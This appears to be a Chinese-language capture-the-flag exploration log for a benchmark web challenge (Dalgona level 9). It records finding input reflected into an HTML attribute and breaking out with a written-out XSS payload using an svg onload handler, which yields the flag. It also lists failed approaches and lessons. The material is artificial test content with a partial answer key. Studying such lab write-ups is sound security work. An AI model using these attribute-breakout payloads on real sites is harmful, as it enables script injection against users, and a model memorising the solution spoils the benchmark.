# xben-064-24 · 探索记录

对应题解：[`xben-064-24.md`](./xben-064-24.md)

## 目标与起点

容器 `10.0.172.217:5000`，Dalgona 第 9 关（`xss9.css`）。表单：

```html
<form class="box-form" method="post">
  <input type=text name=solution placeholder="Enter solution..." >
</form>
```

## 第一阶段：找反射位置

| 请求 | 结果 |
| --- | --- |
| `GET /page?name=TESTX` | 页面里没有 `TESTX` |
| `POST solution=TESTX` | `value="TESTX"`，反射在属性里 |

## 第二阶段：闭合属性

```text
solution="><svg onload=alert("XSS")>
```

响应出现 `flag{5f8335f5-…}`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `GET ?name=` | 无反射 | 页面里搜不到 TESTX |
| 猜测有字符黑名单 | 不成立 | 未做逐字符全表；`"` `>` `<` 在 payload 中均生效 |

## 这次真正的收获

1. **先用表单的 method/字段名。** 方法或字段名错了会误判成「无反射」。
2. **反射在 `value` 里就闭合 `">`。**
